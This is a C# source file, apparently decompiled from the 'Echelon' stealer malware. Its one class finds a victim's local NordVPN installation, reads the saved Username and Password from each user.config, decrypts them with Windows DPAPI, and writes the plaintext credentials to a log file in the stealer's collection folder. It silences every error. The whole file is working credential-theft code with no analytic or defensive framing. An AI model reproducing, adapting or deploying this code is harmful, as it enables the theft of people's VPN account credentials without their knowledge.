using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Echelon.Global;

namespace Echelon.Stealer.VPN
{
	// Token: 0x02000016 RID: 22
	internal class NordVPN
	{
		// Token: 0x0600005C RID: 92 RVA: 0x0001A058 File Offset: 0x00018258
		public static void GetNordVPN(string Echelon_Dir)
		{
			try
			{
				if (Directory.Exists(Help.LocalData + "\\NordVPN\\"))
				{
					Directory.CreateDirectory(Echelon_Dir + NordVPN.NordVPNDir);
					using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + NordVPN.NordVPNDir + "\\Account.log"))
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, "NordVPN"));
						if (directoryInfo.Exists)
						{
							DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
							for (int i = 0; i < directories.Length; i++)
							{
								foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
								{
									streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
									string text = Path.Combine(directoryInfo2.FullName, "user.config");
									if (File.Exists(text))
									{
										XmlDocument xmlDocument = new XmlDocument();
										xmlDocument.Load(text);
										string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
										string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
										if (innerText != null && !string.IsNullOrEmpty(innerText))
										{
											streamWriter.WriteLine("\t\tUsername: " + NordVPN.Nord_Vpn_Decoder(innerText));
										}
										if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
										{
											streamWriter.WriteLine("\t\tPassword: " + NordVPN.Nord_Vpn_Decoder(innerText2));
										}
										NordVPN.count++;
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x0001A218 File Offset: 0x00018418
		public static string Nord_Vpn_Decoder(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0400004F RID: 79
		public static int count;

		// Token: 0x04000050 RID: 80
		public static string NordVPNDir = "\\Vpn\\NordVPN";
	}
}
